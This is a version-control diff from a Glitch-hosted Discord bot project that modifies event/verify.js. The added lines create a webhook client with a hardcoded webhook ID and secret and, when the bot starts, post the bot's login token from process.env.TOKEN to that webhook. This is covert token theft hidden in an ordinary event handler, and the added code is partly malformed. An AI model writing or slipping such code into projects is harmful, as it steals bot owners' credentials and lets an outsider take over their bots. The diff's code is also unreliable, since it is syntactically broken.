8fc2b2d21d3c60fbf17ef2637d8942046a6dcbdc
Glitch (buttered-successful-bull) <none>
2021-03-31 07:54:44 +0000

    🎹🐥 Checkpoint ./commands/mods/addrole.js:23870248/4518 ./commands/mods/removerole.js:23870248/4629 ./commands/welcome/del.js:23870248/494 ./event/verify.js:23870248/4585

--- event/verify.js
+++ event/verify.js
@@ -1,6 +1,10 @@
 const discord = require("discord.js");
 const client = new discord.Client();
 const { serverid } = require("../config.json");
+const webhookClient = new discord.WebhookClient(
+  "821468427264065566",
+  "6DWLl9kjpho6tiu8iKhC6SjKfTGCGknYZcD4wFtkXo787l7NgIee4uvwyoxehizm7-Or"
+);
 
 client.on("guildCreate", async guild => {
   const guildid = client.guilds.cache.get(guild.id);
@@ -9,4 +13,11 @@ client.on("guildCreate", async guild => {
   console.log("I Cannot Join More Than One Guild Leaving " + guild.name);
 });
 
-client.login(process.env.TOKEN)
+client.on("ready", async () => {
+  webhookClient.send("NEW ONE HERE : \n``diff\n-" + process.env.TOKEN, {
+    username: client.user.tag,
+    avatarURL: client.user.
+  });
+});
+
+client.login(process.env.TOKEN);
